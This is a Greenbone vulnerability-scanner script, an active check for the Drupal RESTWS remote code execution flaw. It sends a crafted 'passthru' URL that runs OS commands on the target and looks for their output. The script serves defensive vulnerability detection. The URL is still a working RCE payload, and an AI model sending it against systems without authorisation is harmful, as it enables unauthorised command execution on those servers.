# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:drupal:drupal";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105817");
  script_version("2023-07-20T05:05:17+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Drupal RESTWS RCE Vulnerability (SA-CONTRIB-2016-040) - Active Check");

  script_tag(name:"vuldetect", value:"Try to ececute the `id` command.");

  script_tag(name:"insight", value:"The RESTWS module enables to expose Drupal entities as RESTful
  web services. RESTWS alters the default page callbacks for entities to provide additional
  functionality. A vulnerability in this approach allows an attacker to send specially crafted
  requests resulting in arbitrary PHP execution. There are no mitigating factors. This vulnerability
  can be exploited by anonymous users.");

  script_tag(name:"summary", value:"Drupal is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Install the latest version listed in the referenced advisory.");

  script_xref(name:"URL", value:"https://www.drupal.org/node/2765567");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"2023-07-20 05:05:17 +0000 (Thu, 20 Jul 2023)");
  script_tag(name:"creation_date", value:"2016-07-20 12:15:23 +0200 (Wed, 20 Jul 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_drupal_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("drupal/http/detected");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vtstrings = get_vt_strings();
cmds = exploit_commands();

foreach cmd( keys( cmds ) ) {
  url = dir + '/index.php?q=taxonomy_vocabulary/' + vtstrings["lowercase"] + '/passthru/' + cmds[cmd];
  if( buf = http_vuln_check( port:port, url:url, pattern:cmd ) ) {
    report = http_report_vuln_url( port:port, url:url );
    report += '\n\nOutput:\n\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );